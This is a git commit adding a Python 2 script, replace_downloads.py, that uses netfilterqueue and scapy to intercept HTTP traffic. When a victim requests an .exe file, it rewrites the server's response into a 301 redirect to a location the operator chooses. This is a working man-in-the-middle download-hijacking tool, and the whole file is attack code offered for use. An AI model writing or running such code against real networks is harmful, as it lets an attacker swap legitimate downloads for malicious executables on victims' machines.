6f15821e381a021334f6163845756296a843856c
HellReys <wallpapertopia@gmail.com>
2024-06-29 18:45:33 -0400

    First Update!

---
+++ replace_downloads.py
@@ -0,0 +1,44 @@
+#!/usr/bin/env python
+# It works only python2
+
+import netfilterqueue
+import scapy.all as scapy
+
+
+ack_list = []
+
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            if ".exe" in str(scapy_packet[scapy.Raw].load):
+                print("[+] exe Request")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+
+        elif scapy_packet[scapy.TCP].sport == 80:
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file")
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n\n") #You must be change the location
+
+                packet.set_payload(str(scapy_packet))
+
+
+
+    packet.accept()
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
+
+
+
